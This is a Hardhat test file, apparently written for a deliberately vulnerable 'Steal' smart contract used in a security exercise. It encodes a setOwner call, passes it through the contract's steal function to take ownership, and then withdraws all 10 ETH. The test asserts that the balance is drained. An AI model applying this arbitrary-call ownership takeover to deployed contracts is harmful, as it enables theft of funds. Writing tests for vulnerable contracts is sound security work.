import { expect } from "chai";
import hre, { ethers } from "hardhat";

describe("Steal", function () {
  it("Should steal the funds", async function () {
    const [msg_sender] = await ethers.getSigners();

    const Steal = await hre.ethers.getContractFactory("Steal");
    const bounty = 10000000000000000000n; // 10 ETH

    const steal = await Steal.deploy({ value: bounty.toString() });

    // assert that contract balance is initialized correctly
    expect(await ethers.provider.getBalance(steal.address)).to.equal(bounty);

    const calldata = new ethers.utils.Interface([
      "function setOwner(address)",
    ]).encodeFunctionData("setOwner", [msg_sender.address]);
    await steal.steal(msg_sender.address, calldata);
    await steal.withdraw();

    // assert that contract balance drained
    expect(await ethers.provider.getBalance(steal.address)).to.equal(0);
  });
});
